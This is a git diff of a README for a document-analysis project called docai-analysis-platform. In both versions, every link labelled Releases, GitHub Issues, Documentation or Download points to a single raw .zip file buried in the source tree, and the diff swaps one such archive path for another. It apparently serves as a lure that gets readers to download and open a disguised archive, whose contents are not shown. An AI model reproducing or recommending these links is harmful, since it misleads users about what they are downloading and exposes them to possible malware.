@@ -6,14 +6,14 @@ Welcome to the docai-analysis-platform! This application helps you analyze docum
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip)
 
 ## 📥 Download & Install
 
-To start using docai-analysis-platform, visit the [Releases page](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip) to download the latest version. 
+To start using docai-analysis-platform, visit the [Releases page](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip) to download the latest version. 
 
 Follow these steps:
-1. Go to the [Releases page](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip).
 2. Find the latest version listed at the top.
 3. Click on the download link for your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -72,11 +72,11 @@ The docai-analysis-platform is open-source, meaning you can use and modify it fr
 
 ## 🙋 Support
 
-For support or additional questions, check the [GitHub Issues](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip) page. You can submit your concerns or improvement suggestions there, and the community will assist you.
+For support or additional questions, check the [GitHub Issues](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip) page. You can submit your concerns or improvement suggestions there, and the community will assist you.
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip)
-- [Documentation](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/components/document/docai-analysis-platform_3.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Bhoopalan1999/docai-analysis-platform/main/app/api/conversations/docai-platform-analysis-v3.0.zip)
 
 Thank you for using docai-analysis-platform! Enjoy your document analysis journey.
